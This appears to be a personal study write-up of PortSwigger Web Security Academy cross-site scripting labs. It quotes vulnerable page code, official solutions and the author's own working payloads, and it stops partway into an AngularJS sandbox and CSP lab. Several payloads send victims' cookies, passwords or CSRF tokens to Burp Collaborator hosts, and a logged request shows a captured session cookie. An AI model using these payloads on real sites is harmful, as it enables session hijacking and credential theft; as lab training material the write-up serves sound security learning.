<div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href="/">Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="blog-header">
                        <img src="/resources/images/blog.svg">
                    </section>
                    <section class="blog-list">
                        <div class="blog-post">
                        <a href="/post?postId=1"><img src="/image/blog/posts/67.jpg"></a>
                        <h2>The Lies People Tell</h2>
                        <p>The best kind of lies are the ones you overhear other people telling. You know they are lying because you're standing in a bar when you hear them on the phone saying, 'I'm in the grocery store.' At times like...</p>
                        <a class="button is-small" href="/post?postId=1">View post</a>
                        </div>......
                        <div class="blog-post">
                        <a href="/post?postId=4"><img src="/image/blog/posts/44.jpg"></a>
                        <h2>If I Close My Eyes You Can't See Me</h2>
                        <p>A young man in Ohio was shocked to discover his Mom and Grandma had been witness to his inappropriate online behavior. Forgetting how everyone you have in your friendship circle is inextricably connected on social media, he didn't hold back...</p>
                        <a class="button is-small" href="/post?postId=4">View post</a>
                        </div>
                    </section>
                    <script src="/resources/js/jquery_1-8-2.js"></script>
                    <script src="/resources/js/jqueryMigrate_1-4-1.js"></script>
                    <script>
                        $(window).on('hashchange', function(){
                            var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
                            if (post) post.get(0).scrollIntoView();
                        });
                    </script>
                </div>
```

<div class="component-solution is-expandable">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Notice the vulnerable code on the home page using Burp or the browser's DevTools.
                    </li>
                    <li>
                        From the lab banner, open the exploit server.
                    </li>
                    <li>
                        <p>
                            In the <strong>Body</strong> section, add the following malicious <code>iframe</code>:
                        </p>
                        <code class="code-scrollable">&lt;iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='&lt;img src=x onerror=print()&gt;'"&gt;&lt;/iframe&gt;</code>
                    </li>
                    <li>
                        Store the exploit, then click <strong>View exploit</strong> to confirm that the <code>print()</code> function is called.
                    </li>
                    <li>
                        Go back to the exploit server and click <strong>Deliver to victim</strong> to solve the lab.
                    </li>
                </ol>
            </div>
        </div>



#### DOM XSS in document.write sink using source location.search inside a select element

> This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search` which you can control using the website URL. The data is enclosed within a select element.        
>
> To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the `alert` function.        

Vulnerable code

```html
<form id="stockCheckForm" action="/product/stock" method="POST">
                            <input required="" type="hidden" name="productId" value="1">
                            <script>
                                var stores = ["London","Paris","Milan"];
                                var store = (new URLSearchParams(window.location.search)).get('storeId');
                                document.write('<select name="storeId">');
                                if(store) {
                                    document.write('<option selected>'+store+'</option>');
                                }
                                for(var i=0;i<stores.length;i++) {
                                    if(stores[i] === store) {
                                        continue;
                                    }
                                    document.write('<option>'+stores[i]+'</option>');
                                }
                                document.write('</select>');
                            </script><select name="storeId"><option>London</option><option>Paris</option><option>Milan</option></select>
                            <button type="submit" class="button">Check stock</button>
                        </form>
```

<div class="component-solution is-expandable">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        On the product pages, notice that the dangerous JavaScript extracts a <code>storeId</code> parameter from the <code>location.search</code> source. It then uses <code>document.write</code> to create a new option in the select element for the stock checker functionality.
                    </li>
                    <li>
                        Add a <code>storeId</code> query parameter to the URL and enter a random alphanumeric string as its value. Request this modified URL.
                    </li>
                    <li>
                        In the browser, notice that your random string is now listed as one of the options in the drop-down list.
                    </li>
                    <li>
                        Right-click and inspect the drop-down list to confirm that the value of your <code>storeId</code> parameter has been placed inside a select element.
                    </li>
                    <li>
                        <p>
                            Change the URL to include a suitable XSS payload inside the <code>storeId</code> parameter as follows:
                        </p>
                        <code class="code-scrollable">product?productId=1&amp;storeId="&gt;&lt;/select&gt;&lt;img%20src=1%20onerror=alert(1)&gt;</code>
                    </li>
                </ol>
            </div>
        </div>



#### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

> This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality.        
>
> AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the `ng-app` attribute (also known as an AngularJS directive). When a directive is  added to the HTML code, you can execute JavaScript expressions within  double curly braces. This technique is useful when angle brackets are  being encoded.        
>
> To solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the `alert` function.        

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Enter a random alphanumeric string into the search box.
                    </li>
                    <li>
                        View the page source and observe that your random string is enclosed in an <code>ng-app</code> directive.
                    </li>
                    <li>
                        <p>
                            Enter the following AngularJS expression in the search box:
                        </p>
                        <code class="code-scrollable">{{$on.constructor('alert(1)')()}}</code>
                    </li>
                    <li>
                        Click <strong>search</strong>.
                    </li>
                </ol>
            </div>
        </div>



#### Reflected DOM XSS

> This lab demonstrates a reflected DOM vulnerability. Reflected DOM  vulnerabilities occur when the server-side application processes data  from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing  it to a dangerous sink. 	
>
> To solve this lab, create an injection that calls the `alert()` function. 	

Vulnerable code

```html
<div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href="/">Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <script src="resources/js/searchResults.js"></script>
                    <script>search('search-results')</script>
                    <section class="blog-header">
                    <h1>0 search results for '&lt;/h1&gt;aaa'</h1><hr></section>
                    <section class="search">
                        <form action="/" method="GET">
                            <input type="text" placeholder="Search the blog..." name="search">
                            <button type="submit" class="button">Search</button>
                        </form>
                    </section>
                    <section class="blog-list">
                    <div class="is-linkback"><a href="/">Back to Blog</a></div></section>
                </div>
```

searchResults.js

```javascript
function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText); // !!!
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open("GET", path + window.location.search);
    xhr.send();

    function displaySearchResults(searchResultsObj) {
        var blogHeader = document.getElementsByClassName("blog-header")[0];
        var blogList = document.getElementsByClassName("blog-list")[0];
        var searchTerm = searchResultsObj.searchTerm
        var searchResults = searchResultsObj.results

        var h1 = document.createElement("h1");
        h1.innerText = searchResults.length + " search results for '" + searchTerm + "'"; // 
        blogHeader.appendChild(h1);
        var hr = document.createElement("hr");
        blogHeader.appendChild(hr)

        for (var i = 0; i < searchResults.length; ++i)
        {
            var searchResult = searchResults[i];
            if (searchResult.id) {
                var blogLink = document.createElement("a");
                blogLink.setAttribute("href", "/post?postId=" + searchResult.id);

                if (searchResult.headerImage) {
                    var headerImage = document.createElement("img");
                    headerImage.setAttribute("src", "/image/" + searchResult.headerImage);
                    blogLink.appendChild(headerImage);
                }

                blogList.appendChild(blogLink);
            }

            blogList.innerHTML += "<br/>";

            if (searchResult.title) {
                var title = document.createElement("h2");
                title.innerText = searchResult.title;
                blogList.appendChild(title);
            }

            if (searchResult.summary) {
                var summary = document.createElement("p");
                summary.innerText = searchResult.summary;
                blogList.appendChild(summary);
            }

            if (searchResult.id) {
                var viewPostButton = document.createElement("a");
                viewPostButton.setAttribute("class", "button is-small");
                viewPostButton.setAttribute("href", "/post?postId=" + searchResult.id);
                viewPostButton.innerText = "View post";
            }
        }

        var linkback = document.createElement("div");
        linkback.setAttribute("class", "is-linkback");
        var backToBlog = document.createElement("a");
        backToBlog.setAttribute("href", "/");
        backToBlog.innerText = "Back to Blog";
        linkback.appendChild(backToBlog);
        blogList.appendChild(linkback);
    }
}
```

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
				<ol>
					<li>
						In Burp Suite, go to the Proxy tool and make sure that the Intercept feature is switched on.
					</li>
					<li>
						Back in the lab, go to the target website and use the search bar to search for a random test string, such as <code>"XSS"</code>.
					</li>
					<li>
						Return to the Proxy tool in Burp Suite and forward the request.
					</li>
					<li>
						On the Intercept tab, notice that the string is reflected in a JSON response called <code>search-results</code>.
					</li>
					<li>
						From the Site Map, open the <code>searchResults.js</code> file and notice that the JSON response is used with an <code>eval()</code> function call.
					</li>
					<li>
						By experimenting with different search strings, you can identify that the JSON response is escaping quotation marks. However, backslash is not being escaped.
					</li>
					<li>
						<p>
							To solve this lab, enter the following search term:
						</p>
						<code class="code-scrollable">\"-alert(1)}//</code>
					</li>
				</ol>
               <p>
					As you have injected a backslash and the site isn't escaping them, when the JSON response attempts to escape the opening double-quotes character, it adds a second backslash. The resulting double-backslash causes the escaping to be effectively canceled out. This means that the double-quotes are processed unescaped, which closes the string that should contain the search term.
				</p>
				<p>
					An arithmetic operator (in this case the subtraction operator) is then used to separate the expressions before the <code>alert()</code> function is called. Finally, a closing curly bracket and two forward slashes close the JSON object early and comment out what would have been the rest of the object. As a result, the response is generated as follows:
				</p>
				<code class="code-scrollable">{"searchTerm":"\\"-alert(1)}//", "results":[]}
                </code>
            </div>
        </div>


Eventually eval the code:

```javascript
eval('var searchResultsObj = ' + {"searchTerm":"\\"+alert(1)})//", "results":[]});
```

#### Stored DOM XSS

> This lab demonstrates a stored DOM vulnerability in the blog comment functionality. To solve this lab, exploit this vulnerability to call the alert() function. 

Vulnerable code

```html
<span id="user-comments">
	<script src="resources/js/loadCommentsWithVulnerableEscapeHtml.js"></script>
	<script>loadComments('/post/comment')</script>
	<section class="comment">
        <p>Sophie Mail | 25-04-2022<img class="avatar" src="/resources/images/avatarDefault.svg"></p>
        <p>Every screen on my morning commute is reading your blog. It's like 1984 on this train.</p><p></p>
    </section>
    <section class="comment">
        <p><a id="author" href="http://test.com"></a>111 | 21-05-2022<img class="avatar" src="/resources/images/avatarDefault.svg"></p>
        <p>test1111</p><p></p>
    </section>
</span>
{"searchTerm":"\\"-alert(1)}//", "results":[]}
```

```javascript
// resources/js/loadCommentsWithVulnerableEscapeHtml.js
function loadComments(postCommentPath) {
    let xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            let comments = JSON.parse(this.responseText);
            displayComments(comments);
        }
    };
    xhr.open("GET", postCommentPath + window.location.search);
    xhr.send();

    function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;');
    }

    function displayComments(comments) {
        let userComments = document.getElementById("user-comments");

        for (let i = 0; i < comments.length; ++i)
        {
            comment = comments[i];
            let commentSection = document.createElement("section");
            commentSection.setAttribute("class", "comment");

            let firstPElement = document.createElement("p");
            let avatarImgElement = document.createElement("img");
            avatarImgElement.setAttribute("class", "avatar");
            avatarImgElement.setAttribute("src", comment.avatar ? escapeHTML(comment.avatar) : "/resources/images/avatarDefault.svg");

            if (comment.author) {
                if (comment.website) {
                    let websiteElement = document.createElement("a");
                    websiteElement.setAttribute("id", "author");
                    websiteElement.setAttribute("href", comment.website);
                    firstPElement.appendChild(websiteElement)
                }

                let newInnerHtml = firstPElement.innerHTML + escapeHTML(comment.author)
                firstPElement.innerHTML = newInnerHtml
            }

            if (comment.date) {
                let dateObj = new Date(comment.date)
                let month = '' + (dateObj.getMonth() + 1);
                let day = '' + dateObj.getDate();
                let year = dateObj.getFullYear();

                if (month.length < 2)
                    month = '0' + month;
                if (day.length < 2)
                    day = '0' + day;
                dateStr = [day, month, year].join('-');

                let newInnerHtml = firstPElement.innerHTML + " | " + dateStr
                firstPElement.innerHTML = newInnerHtml
            }

            firstPElement.appendChild(avatarImgElement);
            commentSection.appendChild(firstPElement);

            if (comment.body) {
                let commentBodyPElement = document.createElement("p");
                commentBodyPElement.innerHTML = escapeHTML(comment.body);
                commentSection.appendChild(commentBodyPElement);
            }
            commentSection.appendChild(document.createElement("p"));
            userComments.appendChild(commentSection);
        }
    }
};
```

<div class="component-solution is-expandable">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
				<p>
					Post a comment containing the following vector:
				</p>
                <code class="code-scrollable">&lt;&gt;&lt;img src=1 onerror=alert(1)&gt;</code>
				<p>
					In an attempt to prevent XSS, the website uses the JavaScript <code>replace()</code> function to encode angle brackets. However, when the first argument is a string, the function only replaces the first occurrence. We exploit this vulnerability by simply including an extra set of angle brackets at the beginning of the comment. These angle brackets will be encoded, but any subsequent angle brackets will be unaffected, enabling us to effectively bypass the filter and inject HTML.
				</p>
            </div>
        </div>



### **Exploiting**

#### Exploiting cross-site scripting to steal cookies

> This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Using Burp Suite Professional, go to the Burp menu, and launch the Burp Collaborator client.
                    </li>
                    <li>
                        Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
                    </li>
                    <li>
                        <p>
                            Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
                        </p>
                        <code class="code-scrollable">&lt;script&gt;
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
&lt;/script&gt;</code>
                        <p>
                            This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain on the public Collaborator server.
                        </p>
                    </li>
                    <li>
                        Go back to the Burp Collaborator client window, and click "Poll now". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.
                    </li>
                    <li>
                        Take a note of the value of the victim's cookie in the POST body.
                    </li>
                    <li>
                        Reload the main blog page, using Burp Proxy or Burp Repeater to replace your own session cookie with the one you captured in Burp Collaborator. Send the request to solve the lab. To prove that you have successfully hijacked the admin user's session, you can use the same cookie in a request to <code>/my-account</code> to load the admin user's account page.
                    </li>
                </ol>
                <div class="component-labinstructions">
                    <h4>Alternative solution</h4>
                    <p>
                        Alternatively, you could adapt the attack to make the victim post their session cookie within a blog comment by exploiting the XSS to perform CSRF. However, this is far less subtle because it exposes the cookie publicly, and also discloses evidence that the attack was performed.
                    </p>
                </div>
            </div>
        </div>
Other way

```html
<script>document.location="http://htesdsptbqkc09yepc3vlbxkub01oq.burpcollaborator.net/?"+document.cookie</script>
<!-- official way -->
<script>fetch('https://x.x.x.x', {method: 'POST',mode: 'no-cors',body: document.cookie});</script>
```

HTTP response

```http
GET /?secret=9zJmuvblBTWDx****0ujs1t5Z1WiK2Hc;%20session=cThHNSqrZhe****dE3z09qZ7qNuGQQuN HTTP/1.1
Host: htesdsptbqkc09yepc3vlbxkub01oq.burpcollaborator.net
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

#### Exploiting cross-site scripting to capture passwords

> This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user  views all comments after they are posted. To solve the lab, exploit the  vulnerability to exfiltrate the victim's username and password then use  these credentials to log in to the victim's account.        

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Using Burp Suite Professional, go to the Burp menu, and launch the Burp Collaborator client.
                    </li>
                    <li>
                        Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
                    </li>
                    <li>
                        <p>
                            Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
                        </p>
                        <code class="code-scrollable">&lt;input name=username id=username&gt;
&lt;input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});"&gt;</code>
                        <p>
                            This script will make anyone who views the comment issue a POST request containing their username and password to your subdomain of the public Collaborator server.
                        </p>
                    </li>
                    <li>
                        Go back to the Burp Collaborator client window, and click "Poll now". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.
                    </li>
                    <li>
                        Take a note of the value of the victim's username and password in the POST body.
                    </li>
                    <li>
                        Use the credentials to log in as the victim user.
                    </li>
                </ol>
            </div>
        </div>
```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://mwmtx7rsry5n5s8aqittdm7v4maey3.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

#### Exploiting XSS to perform CSRF

> This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a CSRF attack and change the email address of someone who views the blog post comments.
>
>You can log in to your own account using the following credentials: wiener:peter

Other Way

```javascript
<script>
var req = new XMLHttpRequest;
req.onreadystatechange = function() {
	if (req.readyState == 4) {
        var regx = /name="csrf" value="(.*)"/g;
        var token = regx.exec(req.responseText)[1];
        
        var params = 'email=pwned@evil-user.net&csrf=' + token;
        var req2 = new XMLHttpRequest;
        req2.open('POST', '/my-account/change-email');
        req2.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
        req2.send(params);
	}
}
req.open('GET', '/my-account');
req.send();
</script>
```

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Log in using the credentials provided. On your user account page, notice the function for updating your email address.
                    </li>
                    <li>
                        If you view the source for the page, you'll see the following information:
                        <ul>
                            <li>
                                You need to issue a POST request to <code>/my-account/change-email</code>, with a parameter called <code>email</code>.
                            </li>
                            <li>
                                There's an anti-CSRF token in a hidden input called <code>token</code>.
                            </li>
                        </ul>
                        This means your exploit will need to load the user account page, extract the <a href="/web-security/csrf/tokens">CSRF token</a>, and then use the token to change the victim's email address.
                    </li>
                    <li>
                        <p>
                            Submit the following payload in a blog comment:
                        </p>
                        <code class="code-scrollable">&lt;script&gt;
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&amp;email=test@test.com')
};
&lt;/script&gt;</code>
                        <p>
                            This will make anyone who views the comment issue a POST request to change their email address to <code>test@test.com</code>.
                        </p>
                    </li>
                </ol>
            </div>
        </div>

Official payload

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(.*)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```



### **Content security policy**

#### Reflected XSS protected by very strict CSP, with dangling markup attack

> This lab using a strict CSP that blocks outgoing requests to external web sites (`Content-Security-Policy: default-src 'self';object-src 'none'; style-src 'self'; script-src 'self'; img-src 'self'; base-uri 'none';`).
>
> To solve the lab, first perform a cross-site scripting attack that bypasses the CSP and exfiltrates a simulated victim user's CSRF token using Burp Collaborator. You then need to change the simulated user's email address to hacker@evil-user.net.
>
> You must label your vector with the word "Click" in order to induce the simulated user to click it. For example:
>
> `<a href="">Click me</a>`
>
> You can log in to your own account using the following credentials: wiener:peter 

Vulnerable code

```html
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
                            <label>Email</label>
                            <input required="" type="email" name="email" value="">
                            <input required="" type="hidden" name="csrf" value="dF5K8IOMptyUa0xGK8Zfpx157JtA6zFk">
                            <button class="button" type="submit"> Update email </button>
</form>
```

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
				<ol>
					<li>
						Log in to the lab using the account provided above.
					</li>
					<li>
						Examine the change email function. Observe that there is an XSS vulnerability in the <code>email</code> parameter.
					</li>		
					<li>
						Go to the Burp menu and launch the Burp Collaborator client.
					</li>
					<li>
						Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
					</li>
					<li>
						<p>
							Back in the lab, go to the exploit server and add the following code, replacing <code>your-lab-id</code> and <code>your-exploit-server-id</code> with your lab ID and exploit server ID respectively, and replacing <code>your-collaborator-id</code> with the payload that you just copied from Burp Collaborator.
						</p>
						<code class="code-scrollable">&lt;script&gt;
if(window.name) {
	new Image().src='//BURP-COLLABORATOR-SUBDOMAIN?'+encodeURIComponent(window.name);
	} else {
		location = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://YOUR-EXPLOIT-SERVER-ID.web-security-academy.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
}
&lt;/script&gt;</code>
					</li>
					<li>
						Click "Store" and then "Deliver exploit to victim". When the user visits the website containing this malicious script, if they click on the "Click me" link while they are still logged in to the lab website, their browser will send a request containing their CSRF token to your malicious website. You can then steal this CSRF token using the Burp Collaborator client.
					</li>
					<li>
						Go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see an HTTP interaction that was initiated by the application. Select the HTTP interaction, go to the request tab, and copy the user's CSRF token.
					</li>
					<li>
						With Burp's Intercept feature switched on, go back to the change email function of the lab and submit a request to change the email to any random address.
					</li>
					<li>
						In Burp, go to the intercepted request and change the value of the email parameter to <code>hacker@evil-user.net</code>.
					</li>
					<li>
						Right-click on the request and, from the context menu, select "Engagement tools" and then "Generate CSRF PoC". The popup shows both the request and the CSRF HTML that is generated by it. In the request, replace the CSRF token with the one that you stole from the victim earlier.
					</li>
					<li>
						Click "Options" and make sure that the "Include auto-submit script" is activated.
					</li>
					<li>
						Click "Regenerate" to update the CSRF HTML so that it contains the stolen token, then click "Copy HTML" to save it to your clipboard.
					</li>
					<li>
						Drop the request and switch off the intercept feature.
					</li>
					<li>
						Go back to the exploit server and paste the CSRF HTML into the body. You can overwrite the script that we entered earlier.
					</li>
					<li>
						Click "Store" and "Deliver exploit to victim". The user's email will be changed to <code>hacker@evil-user.net</code>.
					</li>
				</ol>
            </div>
        </div>
exploit

```javascript
<script>if(window.name) {new Image().src='//u4z2r2pg5nkcbt98w5llhkjhy84ysn.burpcollaborator.net?'+encodeURIComponent(window.name);} else {location = 'https://0adc006a042d30abc0a25ca500e600e3.web-security-academy.net/my-account?email="><a href="https://exploit-0ad100ef04dc3071c0ed5c3d01bc005f.web-security-academy.net/exploit">Click me</a><base target='';}</script>
```

Collaborator Client

```http
GET /?%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20required%20type%3D%22hidden%22%20name%3D%22csrf%22%20value%3D%22HdrKksohxrdzRLl7g6E8qa2FM9Tf8oxn%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20class%3D HTTP/1.1
Host: u4z2r2pg5nkcbt98w5llhkjhy84ysn.burpcollaborator.net
```

CSRF POC

```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0adc006a042d30abc0a25ca500e600e3.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker&#64;evil&#45;user&#46;net" />
      <input type="hidden" name="csrf" value="HdrKksohxrdzRLl7g6E8qa2FM9Tf8oxn" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```



#### Reflected XSS protected by CSP, with CSP bypass

> This lab uses CSP and contains a reflected XSS vulnerability.
>
> To solve the lab, perform a cross-site scripting attack that bypasses the CSP and calls the alert function.
>
> Please note that the intended solution to this lab is only possible in Chrome. 
> `Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=`

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        <p>
                            Enter the following into the search box:
                        </p>
                        <code class="code-scrollable">&lt;img src=1 onerror=alert(1)&gt;</code>
                    </li>
                    <li>
                        Observe that the payload is reflected, but the CSP prevents the script from executing.
                    </li>
                    <li>
                        In Burp Proxy, observe that the response contains a <code>Content-Security-Policy</code> header, and the <code>report-uri</code> directive contains a parameter called <code>token</code>. Because you can control the <code>token</code> parameter, you can inject your own CSP directives into the policy.
                    </li>
                    <li>
                        <p>
                            Visit the following URL, replacing <code>your-lab-id</code> with your lab ID:
                        </p>
                        <code class="code-scrollable">https://your-lab-id.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;token=;script-src-elem%20%27unsafe-inline%27</code>
                    </li>
                </ol>
                <p>
                    The injection uses the <code>script-src-elem</code> directive in CSP. This directive allows you to target just <code>script</code> elements. Using this directive, you can overwrite existing <code>script-src</code> rules enabling you to inject <code>unsafe-inline</code>, which allows you to use inline scripts.
                </p>
            </div>
        </div>

Response

```http
HTTP/1.0 200 Connection established
Set-Cookie: session=gb01XL778lDvUefQEuOqsSN8XZqEKYKC; Secure; HttpOnly; SameSite=None
Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=;script-src-elem%20%27unsafe-inline%27","violated-directive":"script-src"}}
Connection: close
Content-Length: 0
```



### **AngularJS sandbox**

#### Reflected XSS with AngularJS sandbox escape without strings

> This lab uses AngularJS in an unusual way where the $eval function is not available and you will be unable to use any strings in AngularJS. To solve the lab, perform a cross-site scripting attack that escapes the sandbox and executes the alert function without using the $eval function. 
>

Observe the input 1

```javascript
<script>
angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) { 
    $scope.query = {};
    var key = 'search';
    $scope.query[key] = '1';
    $scope.value = $parse(key)($scope.query);
});
</script>
<h1 ng-controller="vulnCtrl" class="ng-scope ng-binding">3 search results for 1</h1>
```

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <p>
                    Visit the following URL, replacing <code>your-lab-id</code> with your lab ID:
                </p>
                    <code class="code-scrollable">https://your-lab-id.web-security-academy.net/?search=1&amp;toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1</code>
                <p>
                    The exploit uses <code>toString()</code> to create a string without using quotes. It then gets the <code>String</code> prototype and overwrites the <code>charAt</code> function for every string. This effectively breaks the AngularJS sandbox. Next, an array is passed to the <code>orderBy</code> filter. We then set the argument for the filter by again using <code>toString()</code> to create a string and the <code>String</code> constructor property. Finally, we use the <code>fromCharCode</code> method generate our payload by converting character codes into the string <code>x=alert(1)</code>. Because the <code>charAt</code> function has been overwritten, AngularJS will allow this code where normally it would not.
                </p>
            </div>
        </div>

```javascript
// 1&'a'.constructor.prototype.charAt%3d[].join;[1]|orderBy:'a'.constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
<script>
angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
                            $scope.query = {};
                            var key = 'search';
                            $scope.query[key] = '1';
                            $scope.value = $parse(key)($scope.query);
                            var key = 'toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)';
                            $scope.query[key] = '1';
                            $scope.value = $parse(key)($scope.query);
                        });
});</script>
<h1 ng-controller="vulnCtrl" class="ng-scope ng-binding">3 search results for {{value}}</h1>
```



#### Reflected XSS with AngularJS sandbox escape and CSP

> This lab uses CSP and AngularJS. To solve the lab, perform a cross-site scripting attack that bypasses CSP, escapes the AngularJS sandbox, and alerts document.cookie. And search term cannot exceed 70 characters.
>

<div class="component-solution is-expandable expanded">
